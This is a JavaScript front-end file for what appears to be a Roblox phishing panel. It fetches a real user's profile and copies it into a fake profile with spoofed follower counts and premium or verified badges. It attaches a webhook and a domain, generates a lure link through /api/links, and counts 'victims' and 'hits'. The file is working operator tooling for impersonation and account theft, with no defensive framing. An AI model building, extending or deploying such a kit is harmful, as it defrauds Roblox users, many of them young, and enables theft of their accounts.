// settings.js
let genLink = '';

async function fetchProfile() {
  const u = document.getElementById('real-user').value.trim();
  if (!u) return toast('Enter a username first', 'error');
  const btn = document.getElementById('fetch-btn');
  btn.textContent = '⏳'; btn.disabled = true;
  try {
    const d = await fetch(`/api/roblox/${encodeURIComponent(u)}`).then(r => r.json());
    if (d.error) return toast(d.error, 'error');
    document.getElementById('fake-user').value    = d.username;
    document.getElementById('display-name').value = d.display_name;
    document.getElementById('avatar-url').value   = d.avatar_url || '';
    document.getElementById('friends').value      = d.friends    || 0;
    document.getElementById('following').value    = d.following  || 0;
    document.getElementById('followers').value    = d.followers  || 0;
    const prev = document.getElementById('profile-prev');
    prev.style.display = 'flex';
    prev.innerHTML = `
      <img class="prev-av" src="${d.avatar_url||''}" onerror="this.style.display='none'" alt="">
      <div>
        <div class="prev-name">${d.display_name}</div>
        <div class="prev-id">@${d.username} · ID ${d.id}</div>
        <div style="margin-top:5px">${d.is_banned?'<span class="badge badge-red">Banned</span>':'<span class="badge badge-green">Active</span>'}</div>
      </div>`;
    toast('Profile loaded!', 'success');
  } catch(e) { toast('Fetch failed', 'error'); }
  finally { btn.textContent = '🔍 Fetch'; btn.disabled = false; }
}

async function generateLink() {
  const fake_username = document.getElementById('fake-user').value.trim();
  const display_name  = document.getElementById('display-name').value.trim();
  const avatar_url    = document.getElementById('avatar-url').value.trim();
  const webhook       = document.getElementById('webhook').value.trim();
  const birthday      = document.getElementById('birthday').value;
  const status        = document.getElementById('status').value;
  const premium       = document.getElementById('premium').checked;
  const verified      = document.getElementById('verified').checked;
  const friends       = parseInt(document.getElementById('friends').value)   || 0;
  const following     = parseInt(document.getElementById('following').value) || 0;
  const followers     = parseInt(document.getElementById('followers').value) || 0;
  const domain        = document.getElementById('domain').value.trim().replace(/\/$/,'');
  const real_username = document.getElementById('real-user').value.trim();

  if (!fake_username) return toast('Fake username required', 'error');
  if (!domain)        return toast('Domain required', 'error');

  try {
    const d = await fetch('/api/links', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ real_username, fake_username,
        display_name: display_name||fake_username, avatar_url,
        webhook, birthday, premium, verified, status,
        friends, following, followers, domain })
    }).then(r => r.json());

    if (!d.success) return toast('Failed to create link', 'error');
    genLink = d.link;
    document.getElementById('gen-link-val').textContent = genLink;
    document.getElementById('gen-link-card').style.display = 'block';
    document.getElementById('gen-link-card').scrollIntoView({ behavior:'smooth', block:'nearest' });
    toast('Link generated! 🎉', 'success');
    loadQuickStats();
  } catch(e) { toast('Error: '+e.message, 'error'); }
}

function copyGenLink() { copy(genLink, '🔗 Link copied!'); }

async function loadQuickStats() {
  try {
    const d = await fetch('/api/stats').then(r => r.json());
    document.getElementById('qs').innerHTML = `
      <div class="result-box" style="margin-top:0">
        <div class="r-row"><span class="r-key">Total Links</span><span class="r-val">${d.totalLinks}</span></div>
        <div class="r-row"><span class="r-key">Total Hits</span><span class="r-val">${d.totalVictims}</span></div>
        <div class="r-row"><span class="r-key">Today's Hits</span><span class="r-val">${d.todayVictims}</span></div>
      </div>`;
  } catch(e) {}
}

document.addEventListener('DOMContentLoaded', loadQuickStats);
